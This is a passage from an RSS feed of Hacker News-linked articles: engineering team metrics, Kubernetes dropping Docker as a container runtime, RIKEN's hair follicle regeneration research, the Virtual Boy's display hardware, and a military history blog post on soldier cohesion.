<p>In pull request, you can do this by first commits to production. In JIRA, it can start from triaged to production as well one nuance there is the JIRA. One might not be accurate because engineers it’s like an extra process.&nbsp; It’s not in their habits to track.</p>



<p>Make sure that the JIRA task is correctly tagged, but Github one pull requests. It’s in their habit, it’s in their workflow. They make sure that pull request is tagged correctly because they don’t actually control the tag. They just behave normally and you can get that data from it. So I would recommend specifically focusing on pull requests, but JIRA is also a way to track cycle time.</p>



<p>So what I have talked about was speed, deployment frequency, and cycle time. Now we can go to <strong>quality metrics</strong>, which also divides into two different categories. The pair of deployment frequency is hotfixes. It is called <strong>change failure rates</strong>…</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/">https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/</a></em></p>]]>
            </description>
            <link>https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118547</guid>
            <pubDate>Fri, 12 Feb 2021 21:07:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kubernetes is deprecating Docker: what you need to know]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26118044">thread link</a>) | @forrestbrazeal
<br/>
February 12, 2021 | https://acloudguru.com/blog/engineering/kubernetes-is-deprecating-docker-what-you-need-to-know | <a href="https://web.archive.org/web/*/https://acloudguru.com/blog/engineering/kubernetes-is-deprecating-docker-what-you-need-to-know">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><h2 id="h-kubernetes-is-deprecating-docker">Kubernetes is Deprecating Docker?!</h2><p>For some time now, it seems that when people think of containers, they think of <a href="https://acloudguru.com/course/introduction-to-containers-and-docker">Docker</a> and <a href="https://acloudguru.com/course/kubernetes-deep-dive">Kubernetes</a>. Docker has been the big name when it comes to building and running containers, and Kubernetes has been the big name when it comes to managing and orchestrating them. It might seem a bit shocking to hear that Kubernetes is deprecating support for Docker as a container runtime starting with Kubernetes version 1.20.</p><p>So, I want to take this opportunity to talk about what this change really means, and what Kubernetes users will need to do about it.</p><figure><p> <iframe title="Kubernetes This Month: Container usage in production goes through the roof!" width="500" height="281" src="https://www.youtube.com/embed/KzCaCBIgGvI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure><h2 id="h-what-s-changing">What’s Changing?</h2><p>Kubernetes deprecating Docker is actually not as big of a deal as it sounds, so let’s talk about what is really going on here.</p><p>Kubernetes is removing support for Docker as a <strong>container runtime</strong>. Kubernetes does not actually handle the process of running containers on a machine. Instead, it relies on another piece of software called a <strong>container runtime</strong>.</p><figure><img src="https://lh3.googleusercontent.com/ZdkIrgRa5Kx9RkYvsf_MitDSotGYiXP1dwpSE03SitQcSuHrk8VHKjGr5Mkdo8OXtoFsQpYv4UNaLw7xXLlbcYvvUDNyFM_Tcx2ussVCo7E9Z_aNj_NeN2AXJmLESV60PSp7hfVf" alt=""></figure><p>The container runtime runs containers on a host, and Kubernetes tells the container runtime on each host what to do. You can actually choose from a variety of options when it comes to what software you want to use as your container runtime when running Kubernetes. Up to now, a fairly popular option was to use Docker as the container runtime.</p><p>However, this will no longer be an option in the future. You will still be able to use Docker in other ways that are relevant to Kubernetes (more on that in a moment), but you will not be able to use Docker as the container runtime underneath Kubernetes.</p><h2 id="h-why-is-kubernetes-deprecating-docker">Why is Kubernetes Deprecating Docker?</h2><p>Kubernetes has supported using Docker a container runtime up to this point, so why are they choosing to stop supporting it?</p><p>Kubernetes works with all container runtimes that implement a standard known as the <strong>Container Runtime Interface (CRI)</strong>. This is essentially a standard way of communicating between Kubernetes and the container runtime, and any runtime that supports this standard automatically works with Kubernetes.</p><p>Docker does not implement the Container Runtime Interface (CRI). In the past, there weren’t as many good options for container runtimes, and Kubernetes implemented the Docker shim, an additional layer to serve as an interface between Kubernetes and Docker. Now, however, there are plenty of runtimes available that implement the CRI, and it no longer makes sense for Kubernetes to maintain special support for Docker.</p><h2 id="h-what-s-really-going-on">What’s Really Going On?</h2><p>To really understand why it makes sense for Kubernetes to deprecate Docker, we need to go a little deeper.</p><p>I’ll let you in on a secret: <strong>Docker is not actually a container runtime</strong>! It’s actually a collection of tools that sits on top of a container runtime called <strong>containerd</strong>.</p><p>That’s right! Docker does not run containers directly. It simply creates a more human-accessible and feature-rich interface on top of a separate, underlying container runtime. When it is used as a container runtime for Kubernetes, Docker is just a middle-man between Kubernetes and containerd.</p><figure><img src="https://lh3.googleusercontent.com/qAs7sRi19J_vdE9NYNyZ5MZp8rFoV4aNUmn4aGtrc4zJXsgA_Not2cG68ut6XAXxVFAiBDyK-zp7FO6-sdcFv2obvfIxBrkcsawBisG7IKirWP4ODOlwP0kz1V9vNn_TbXAhaGKz" alt=""></figure><p>However, Kubernetes can use containerd directly as a container runtime, meaning Docker is no longer needed in this middle-man role. Docker still has a lot to offer, even in a Kubernetes ecosystem. It’s just not needed specifically as a container runtime.</p><figure><img src="https://lh4.googleusercontent.com/cNGPBxKBF4_Vm_WvKM4QWqXGrX4LqgaJfUUxVycD3d5XPuyXS8aWH8zeEooL--2MSDUhKzOmwCdYPGo6Zpga0xIk3EzyNq2fyDbHc0akoGLbBfnymOODbDPHh2zAhHzvdvsFxUxS" alt=""></figure><h2 id="h-what-s-the-role-of-docker-going-forward">What’s the Role of Docker Going Forward?</h2><p>Although Docker is not needed as a container runtime in Kubernetes, it still has a role to play in the Kubernetes ecosystem, and in your workflow.</p><p>Docker is still going strong as a tool for developing and building container images, as well as running them locally. Kubernetes can still run containers built using Docker’s <strong>Open Container Initiative (OCI) </strong>image format, meaning you can still use Dockerfiles and build your container images using Docker.</p><p>Kubernetes will also continue to be able to pull from Docker registries (such as Docker hub). This means that Docker will remain a powerful contender when it comes to managing the images once they are built.</p><p>All in all, Docker will continue to be a useful tool on your development workflows and continuous integration (CI) systems, even if you don’t need it to run your containers underneath Kubernetes in production.</p><hr><p><em>Looking to get certified on K8s? Read our <a href="https://acloudguru.com/blog/engineering/which-kubernetes-certification-path-should-i-take">blueprint for the Kubernetes certification journey</a>. </em></p><hr><h2 id="h-what-should-i-do">What Should I Do?</h2><p>&nbsp;If you are currently using Docker as a container runtime in your Kubernetes environment, you will need to make some changes. Moving forward, you can simply eliminate Docker as a middle-man in your Kubernetes environment. Instead, use another container runtime, such as <a href="https://containerd.io/">containerd</a> or <a href="https://cri-o.io/">CRI-O</a>.</p><p>Before upgrading to a Kubernetes version removes support for Docker (which is currently estimated to release in late 2021), you will need to modify (or replace) existing Kubernetes nodes so that they use a supported container runtime other than Docker. Starting now, you may want to start building any new nodes so that they use a non-Docker container runtime as well.</p><p>Other than that, nothing is really changing. You can continue to use Docker to build your images, as well as to run containers locally for development purposes, or in your continuous integration (CI) stack. You can also continue to use Docker registries to store and manage your images.</p><p>If you are interested in learning how to use containerd alongside Kubernetes, check out my new course, <a href="https://acloud.guru/overview/introduction-to-kubernetes">Introduction to Kubernetes</a>. It includes lessons that will walk you through the process of installing containerd and using it in your Kubernetes cluster.</p></div></div></div>]]>
            </description>
            <link>https://acloudguru.com/blog/engineering/kubernetes-is-deprecating-docker-what-you-need-to-know</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118044</guid>
            <pubDate>Fri, 12 Feb 2021 20:14:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compilation of interesting posts on productivity/procrastination]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26117739">thread link</a>) | @haishanqian
<br/>
February 12, 2021 | https://on.clew.ai/page/b15be8fc-8ed8-4872-943b-d234bebf6df0 | <a href="https://web.archive.org/web/*/https://on.clew.ai/page/b15be8fc-8ed8-4872-943b-d234bebf6df0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://on.clew.ai/page/b15be8fc-8ed8-4872-943b-d234bebf6df0</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117739</guid>
            <pubDate>Fri, 12 Feb 2021 19:44:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A recipe for cyclical regeneration of bioengineered hair]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26117598">thread link</a>) | @simonebrunozzi
<br/>
February 12, 2021 | https://www.riken.jp/en/news_pubs/research_news/pr/2021/20210210_3/index.html | <a href="https://web.archive.org/web/*/https://www.riken.jp/en/news_pubs/research_news/pr/2021/20210210_3/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="contents">
<main id="main">

<div>
<!-- main area -->

	 
<!-- メインエリア -->   
<p><b>Researchers at the RIKEN Center for Biosystems Dynamics Research in Japan have discovered a recipe for continuous cyclical regeneration of cultured hair follicles from hair follicle stem cells.</b></p>
<p>Scientists have been making waves in recent years by developing ways to grow a variety of useful items in laboratories, from meat and diamonds to retinas and other organoids. At the RIKEN Center for Biosystems Dynamics Research in Japan, a team led by Takashi Tsuji has been working on ways to regenerate lost hair from stem cells. In an important step, a new study identifies a critical population of hair follicle stem cells in the skin and a recipe for normal cyclical hair regeneration in the lab.</p>
<p>The researchers took fur and whisker cells from mice and cultured them in the laboratory with other biological “ingredients”. They used 220 combinations of ingredients, and found that combining a type of collagen with five factors — the NFFSE medium — led to the highest rate of stem cell amplification in the shortest period of time.</p>
<p>Hair growth in mammals is a continuous cyclical process in which hair grows, falls out, and is grown again. Growth occurs in the anagen phase and hair falls out in the telogen phase. Thus, a successful hair-regeneration treatment must produce hair that recycles. To test whether stem cells cultured in the NFFSE medium produce hair that cycles, the researchers placed bioengineered hair follicle stem cells in NFFSE medium or in medium missing one of the ingredients and observed the regenerated hair for several weeks. They found 81% of hair follicles generated in NFFSE medium went through at least three hair cycles and produced normal hair. In contrast, 79% of follicles grown in the other medium produced only one hair cycle.</p>
<p>Knowing that stem-cell renewal can depend on what is attached to the outside of the cells, the researchers next looked for markers on the surface of cells cultured in the NFFSE medium. In addition to the expected CD34 and CD49f markers, they found the best hair cycling was related to the addition of Itgβ5. “We found almost 80% of follicles reached three hair cycles when Itgβ5 was also bioengineered into the hair follicle germ,” explains first author Makoto Takeo. “In contrast, only 13% reached three cycles when it was not present.” Analysis showed that these important cells are naturally located in the upper part of the hair follicle’s bulge region.</p>
<p>“Our culture system establishes a method for cyclical regeneration of hair follicles from hair follicle stem cells,” says Tsuji, “and will help make hair follicle regeneration therapy a reality in the near future.” As preclinical animal-safety tests using these cultured cells were completed in 2019, the next step in the process is clinical trials.</p>
<p>“RIKEN is primarily an institute that does basic research,” explains Tsuji. “And clinical trials usually require outside collaborators. We are therefore looking for a partner company to help develop the clinical applications and welcome donations to promote the R&amp;D.”</p>
<h2 id="ReferenceSection">Reference</h2>
<p>Takeo  <span>et al</span>. (2021) <b>Expansion and characterization of epithelial stem cells with potential for cyclical hair regeneration. </b> <span>Sci Rep</span>. doi: <a href="https://doi.org/10.1038/s41598-020-80624-3">10.1038/s41598-020-80624-3</a></p>
<h2><b>Contact</b></h2>
<p>Takashi Tsuji, Team Leader<br>
  <a href="https://www.riken.jp/en/research/labs/bdr/organ_regen/">Laboratory for Organ Regeneration</a><br>
  <a href="https://www.riken.jp/en/research/labs/bdr/">RIKEN Center for Biosystems Dynamics Research</a></p>  
<p>Adam Phillips<br> RIKEN International Affairs Division<br> Tel: +81-(0)48-462-1225 / Fax: +81-(0)48-463-3687<br> Email: pr [at] riken.jp</p>
  <div id="fig1"><p><img src="https://www.riken.jp/news-pubs-en/research-news-en/2021-research-en/20210210_3_fig1.png" alt="Image of regenerated hair"></p><p><b>Regenerated hair cycles properly</b><br>
Top row: Hair regenerated using the NFFSE medium that contains five critical factors. Note the hair cycles 4 times (growth → falling out → new growth → repeat). Bottom row: Hair regenerated on medium missing one of the critical ingredients. Hair only cycled once in this case.</p> 
</div>  
<div id="fig2"><p><img src="https://www.riken.jp/news-pubs-en/research-news-en/2021-research-en/20210210_3_fig2.png" alt="Diagrams of fur and whisker"></p><p><b>Hair follicle stem cells important for proper hair cycles</b><br>
Diagram of back fur and whisker hair follicles. The study found that when Itgβ5 was present in hair follicle stem cells located in the upper bulge of the follicle, the hair went through many more cycles than when those cells were absent.</p> 
</div>  
<!-- /main -->
<!-- /main area -->
<!-- /.container01 --></div>
<!-- /#main --></main>
<!-- /#contents --></div></div>]]>
            </description>
            <link>https://www.riken.jp/en/news_pubs/research_news/pr/2021/20210210_3/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117598</guid>
            <pubDate>Fri, 12 Feb 2021 19:32:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virtual Boy Architecture: A Practical Analysis]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26117584">thread link</a>) | @strangecasts
<br/>
February 12, 2021 | https://www.copetti.org/writings/consoles/virtual-boy/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/virtual-boy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><div><ul><li><a href="#cover-model">Model</a></li><li><a href="#cover-motherboard">Motherboard</a></li><li><a href="#cover-diagram">Diagram</a></li></ul><div><div id="cover-motherboard"><figcaption>The mainboard<br>Not to be confused with the 'Servo board' which the mainboard connects to.<br>Virtual Sound Unit IC, 128 KB of DRAM and 64 KB of PSRAM are fitted on the back.</figcaption></div><div id="cover-diagram"><a href="https://www.copetti.org/images/consoles/virtualboy/diagram.png"><picture>
<img width="1185" height="1062" alt="Diagram" loading="auto" src="https://www.copetti.org/images/consoles/virtualboy/diagram.png"></picture></a><figcaption>Notice how the two screenshots have its background scenery slightly shifted horizontally</figcaption></div></div></div><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>A console often summarised by its short lifespan and limited colour space. While technically correct, I believe these attributes tend to overlook other surprising properties.</p><p>In this article, I invite readers to learn more about its internal features, many of which became predominant in the market only after the Virtual Boy’s discontinuation.</p><hr><h2 id="display">Display</h2><p>The whole system is a curious piece of engineering. Externally, it resembles a bulky VR headset on a bipod. The player must place their head close to the eyepiece to see the game in action.</p><div><a href="https://www.copetti.org/images/consoles/virtualboy/case/front.f5ed2bf56afcaf7238bb81e26e42ea66a11e68a40b14581affc282e9ee25c268.png"><picture>
<img name="image_cover" alt="Image" width="1111" height="526" src="https://www.copetti.org/images/consoles/virtualboy/case/front.f5ed2bf56afcaf7238bb81e26e42ea66a11e68a40b14581affc282e9ee25c268.png" loading="auto"></picture></a><figcaption>This is as far as I get trying to shoot a photo of the display and the case at the same time. In reality, games look very crisp and in full size!</figcaption></div><p>Internally, it’s a whole different story (and a very complicated one too). For this reason, I thought it would be better to start by explaining how this console displays images and then go through the internal hardware.</p><h4 id="projecting-an-image">Projecting an image</h4><p>Once you switch the Virtual Boy on, you will start seeing two <strong>monochromatic red</strong> pictures (one for each eye) through the eyepiece. So far so good? Well, here is the interesting part: <strong>This console doesn’t have a screen</strong>, so what you see is more of an ‘illusion’ - Let’s dive deeper to know what’s going on.</p><p>The topics involved in explaining this (optics, visual phenomenons, etc) may feel difficult at first, but I constructed some interactive animations to make this section little more immersive.</p><div><ul><li id="tab-2-1-scanner-link"><a href="#tab-2-1-scanner">Scanner</a></li><li id="tab-2-2-mechanics-link"><a href="#tab-2-2-mechanics">Mechanics</a></li><li id="tab-2-3-display-link"><a href="#tab-2-3-display">Display</a></li><li id="tab-2-4-active-periods-link"><a href="#tab-2-4-active-periods">Active periods</a></li></ul><div><div id="tab-2-1-scanner"><h4>Scanner</h4><p>The large volume of this console can be attributed to the <strong>Scanner</strong>, which fills up a big part of it. The Scanner is the area of the Virtual Boy that displays images. It’s composed of two <strong>Display units</strong>, each one independently projects a frame (giving a total of two frames, one per eye).</p><p>A Display unit is where all the ‘magic’ happens, it’s made of the following components:</p><ul><li>An <strong>LED Unit</strong>: Contains 224 red LEDs stacked vertically and the necessary circuitry to control each one of them.</li><li>A <strong>Lens</strong>: Refracts the light coming from the LEDs.<ul><li>At the top of the Virtual Boy’s case, there is a <strong>Focus slider</strong> used to shift the lenses closer or further away from the LEDs. This allows the user to adapt the console to their focal length (preventing blurry images).</li></ul></li><li>A <strong>Mirror</strong>: Reflects the light coming from the lens and directs them to the user’s eyes. Furthermore, this component will be constantly oscillating thanks to a <strong>Voice coil motor</strong> connected to it. The motor is managed by the <strong>Servo control</strong>, a separate board which sends electrical pulses at 50 Hz.<ul><li>All in all, this is a very complex and fragile area of the console, so there’s a photo interrupter (a type of photosensor) installed. This reports the oscillation observed from the mirror to the Servo control, which in turns monitors the oscillations and applies the necessary corrections.</li></ul></li></ul><p>Next to the focus slider there is a <strong>IPD dial</strong> (knob-shaped switch), which adjust the distance between the two Display units. This is done to adapt the displays to the user’s inter-pupil distance.</p></div><div id="tab-2-2-mechanics"><h4>Mechanics</h4><div><figcaption>Basic representation of the angle of the oscillating mirror over time (at a very slow motion)<br>The left and right LEDs are operating (active) during the red and blue period, respectively<br>During the grey period, no LED is operating (idle)<br>For sake of simplicity, the angular velocity represented here is constant (but not in the real world)</figcaption></div><p>Now that we have each component identified, let’s take a look how the Virtual Boy manages to show images to our eyes.</p><p>If you haven’t noticed before, there <strong>isn’t any dot-matrix display to be found</strong>, so why are we seeing two-dimensional images from the eyepiece? Similarly to the functioning of a CRT monitor, Display units play with the way we perceive images:</p><ul><li>The fact the mirrors oscillate enables a single column of LEDs to displace horizontally between our field of view. The angle of the mirror is strategically directed to place the LEDs on 384 different ‘column positions’ distributed across our field of view.</li><li>Human vision is logarithmic and the mirror oscillates at <strong>50 Hz</strong> (each period takes 20 ms). This is so fast we end up perceiving 384 columns of LEDs illuminating at the same time (afterimage effect) until the mirror stops oscillating.</li><li>All of this is perfectly synchronised with the LED controller, which updates each LED bulb every time the mirror is slightly moved. Thus, we end up seeing a full picture coming from the eyepiece.</li></ul><p>In practice, there are some conditions for all these principles to work:</p><ul><li>The LEDs must only operate when the angular velocity of the mirror is stable (in other words, not when the mirror is changing direction). This can be thought of as the <a href="https://www.copetti.org/writings/consoles/master-system/#tab-2-4-result"><strong>Active State</strong></a> of a CRT monitor.</li><li>In relation to the previous point, the angular velocity of the mirror can’t stay constant (since the mirror can’t change direction instantly, the periods considered ‘stable’ will be subject to forces that will disrupt its velocity). To remedy this, the Virtual Boy stores a list of values in memory called <strong>Column Table</strong> which instructs how much time to dedicate for each column interval, in an effort to balance out excessive &amp; insufficient periods of ‘LED column’ exposure.</li><li>Let’s not forget that this whole process has to be done twice since we got two display units (one per eye). Unfortunately, both units can’t pull energy and data at the same time, so each one operates at different display periods (out-of-phase, 10ms apart). We don’t notice this (another illusion!).</li></ul></div><div id="tab-2-3-display"><h4>Display</h4><div><figcaption>Simplified representation of how the first LED unit operates during specific periods of time. Notice how the LEDs will start displaying each column of the frame-buffer during active periods.</figcaption></div><p>Contrary to previous video chips modelled after CRT displays (i.e. <a href="https://www.copetti.org/writings/consoles/nes/#graphics">PPU</a> and <a href="https://www.copetti.org/writings/consoles/master-system/#graphics">VGP</a>), graphics on the Virtual Boy are <strong>not rendered on-the-fly</strong>. The graphics chip on this console sends the processed frame to a frame-buffer in memory, each column of the frame is then sent to the LED array for display.</p><p>Once the Servo board detects it’s time for display, the graphics chip will start sending columns of pixels from the frame-buffer to those 224 vertically-stacked LEDs, one-by-one in a strategically synchronised matter so the LEDs will have shown 384 columns during the display period. Hence, the ‘screen resolution’ of this console is 384x224 pixels.</p><p>Moreover, we need to store two frame-buffers since each one will go to a different display unit. The graphics subsystem also employs double-buffering and other quirks (mentioned later in the ‘Graphics’ section). So, for now, just remember how a digital frame is sent to the LEDs.</p></div><div id="tab-2-4-active-periods"><h4>Active periods</h4><div><figcaption>Another simplified animation, this time showing how the oscillation of the mirror deviates the LEDs light in a way the user will end up seeing a proper frame</figcaption></div><p>Consequently of this design, there are going to be periods of:</p><ul><li><strong>Active Display</strong> during which the LEDs are pulling an image from the frame-buffer and nothing can disrupt it.</li><li><strong>Active Display 2</strong>: Same as before but now the other Display unit is operating.</li><li><strong>Drawing idle</strong>: A period where none of the LEDs are operating and the angular velocity of the mirror is unstable.</li></ul><p>This cycle is repeated 50 times per second (hence the 50 Hz refresh rate). That means that for every frame, the CPU and GPU would have around 10ms worth of time to update the picture that the user will see. In reality, Nintendo’s engineers implemented something more sophisticated. Again, I’ll try to explain this with more depth in the ‘Graphics’ section. But for now I hoped you got a good understanding of how the Virtual Boy cleverly managed to produce a picture with inexpensive hardware.</p></div></div></div><p>This has been a quick explanation of how optics can turn a single vertical line into a picture. If you own or have read about the Virtual Boy before, you may be wondering when the three-dimensional imagery takes place. I just want to make it clear that none of the previous explanation have a connection with that effect. I’m mentioning this because in the past I’ve seen many places arguing that the oscillating mirrors are the cause of the ‘depth perception’, however, with all the information I’ve gathered in this study, I don’t think that claim is accurate.</p><p>That being said, I think it’s time we discuss the 3D phenomenon…</p><h4 id="creating-a-third-dimensional-vision">Creating a third-dimensional vision</h4><p>During the marketing of the Virtual Boy, there was a lot of fanfare regarding the fact this console could project a ‘3D world’. I’m not referring to images with 3D polygons stamped (like the other 5th gen. consoles), but the actual perception of depth.</p><p>In a nutshell, the Virtual Boy relies on <strong>Stereoscopic images</strong> to carry out that illusion. So this system wasn’t only capable of toying with our vision to project a full image, but it also did it in a way we would think certain drawings are closer/far away from others!</p><div><div><figcaption>Snapshot of the game seen from the different display units<br>Mario's Tennis (1995)</figcaption></div><p>The technique is very simple: Each of the two frames displayed (one on each eye) will have some elements slightly shifted horizontally, so when we try to see them with our two eyes, our brain will think they are nearer than others. This depends on the direction the elements are shifted.</p><p>Objects shifted towards the centre of your eyes (moved right on the left frame and moved left on the right frame) will appear closer, objects shifted away from the center of your eyes will appear further away. Finally, objects with no shifting will appear between the two other. This approach is called <strong>Stereoscopic parallax</strong>.</p></div><p>One of the drawbacks of stereoscopy is <strong>eyestrain</strong>. This was alleviated by the fact games provided an ‘automatic pause’ system which reminded the user to take breaks every 30 min. Nintendo also wrote down various warning messages in their packaging and …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.copetti.org/writings/consoles/virtual-boy/">https://www.copetti.org/writings/consoles/virtual-boy/</a></em></p>]]>
            </description>
            <link>https://www.copetti.org/writings/consoles/virtual-boy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117584</guid>
            <pubDate>Fri, 12 Feb 2021 19:31:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Universal Warrior, Part IIb: A Soldier’s Lot]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26117386">thread link</a>) | @parsecs
<br/>
February 12, 2021 | https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the continuation of the second part of a three part (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, <a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">IIa</a>, III) discussion of the notion that there is a ‘universal warrior’ – a transcendent sameness about either the experience of war or ‘warrior values’ which might provide some sort of useful blueprint for life generally or some sort of fundamental truth about the experience of war.</p>



<p><a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">We started this section last week </a>by looking at the forms of war along with the direct emotional experience of combat.  What we found is that, quite to the contrary of there being just one sort of war that ‘never changes,’ there are in fact multiple <em>systems</em> of war that function quite differently (with considerable variation both within and between those systems) to the point that armies often find opponents working from within a different system of war almost utterly alien to them.</p>



<p>Moreover, as we discussed, the experience of battle, not merely the technology, tactics and circumstances, but the <em>raw emotional experience</em> (taken in terms of courage and fear) wasn’t constant either.  Different cultures understood ‘courage’ differently (and we must remember that translation here can be deceiving – most of them didn’t understand ‘courage’ at all, they understood <em>andreia</em> or <em>fortis </em>or <em>corage</em> or <em>der Mut</em> or <em>woohitike</em> which are, in the end, subtly different things and so not quite ever exactly courage at all) and different battles imposed different sorts of fear which strained those combatants in different ways.</p>



<p>Now we’re going to keep soldiering on and look at some of the other factors of the war experience: the importance of comrades, the drudgery and toil of war, and of course wounds (both physical and mental) and their healing.  Once again, to abuse the opening lines of the <em>Fallout</em> series, we going to ask if it is really true that “War, war never changes.”</p>



<figure><img data-attachment-id="6241" data-permalink="https://acoup.blog/fallout-4/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png" data-orig-size="1055,578" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fallout-4" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=768 768w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png 1055w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The iconic introduction line from all of the Fallout games (this is the version from Fallout 4.<br>As we’re going to see, this <strong>sounds</strong> true, but isn’t.  War changes quite a lot.</figcaption></figure>



<p>But first, as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<h2>The Ties that Bind</h2>



<p>What about the personal relationships that are formed in the context of conflict?  Surely, the ‘band of brothers’ is a truly universal experience, right (<a href="https://youtu.be/76_Q9ruJfrE">but note on the complexities of Shakespeare’s <em>Henry V</em></a>)?  Surely the social bonds that held<a href="https://en.wikipedia.org/wiki/Band_of_Brothers_(miniseries)"> Easy-Company</a> together in 1944 and 1945 are the same as those from 1415?  Or 415?</p>



<p>Well, no.  Not quite.</p>



<p>We can approach this question through the idea of cohesion – the moral force that holds a group of combatants together on the battlefield under the intense emotional stresses of combat.  The intense bonds that soldiers form in modern armies (particularly those in the European pattern) are not an accident, but a core part of how those armies, institutionally, seek to build cohesion.  Going back to last week, we discussed briefly the emergence of the extensively drilled and disciplined ‘mechanical’ soldier of Early Modern Europe, noting that this approach wasn’t necessary for the effective use of firearms (the Ottoman Janissaries, for instance, were quite good with firearms, but were not trained and organized in this way), but rather was a product of elite aristocratic (read: officer) disdain for their up-jumped peasant soldiers and thus the assumption by those aristocrats that the only way to get such men to fight effectively was to relentlessly drill them.</p>



<figure><img data-attachment-id="6231" data-permalink="https://acoup.blog/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg" data-orig-size="723,351" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="hohenfriedeberg_-_attack_of_prussian_infantry_-_1745" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=723" src="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=723" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg 723w, https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=300 300w" sizes="(max-width: 723px) 100vw, 723px"><figcaption><a href="https://en.wikipedia.org/wiki/Prussian_Army#/media/File:Hohenfriedeberg_-_Attack_of_Prussian_Infantry_-_1745.jpg">Via Wikipedia</a>, the Attack of Prussian Infantry, 4 